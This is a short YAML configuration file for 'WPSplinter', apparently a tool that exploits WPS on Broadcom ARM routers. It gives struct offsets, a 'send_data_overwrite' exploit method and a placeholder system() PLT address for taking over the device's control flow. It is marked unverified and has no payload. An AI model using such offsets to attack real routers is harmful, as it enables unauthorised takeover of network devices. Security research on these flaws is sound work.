# WPSplinter Configuration: Generic Broadcom ARM
# Fallback configuration for Broadcom ARM routers

manufacturer: "Generic"
model: "Broadcom ARM"
firmware: "*"
architecture: "arm"
cpu: "BCM*"
endianness: "little"
exploit_method: "send_data_overwrite"
verified: false

offsets:
  frags_received: 0x0000
  total_bytes_to_recv: 0x0800
  total_received: 0x0804
  next_frag_to_send: 0x0808
  frag_size: 0x080C
  flags: 0x0818
  last_sent: 0x081C
  last_sent_len: 0x0820
  send_data: 0x0838

plt_addresses:
  system: 0x000000  # Must be determined per target

timing:
  calibrate_delay: 0.3
  frag_ack_timeout: 3.0
  resend_timer: 5.0

notes:
  - "Default Broadcom ARM configuration"
  - "Use as fallback when specific config not available"
  - "PLT address must be provided via --system_plt"
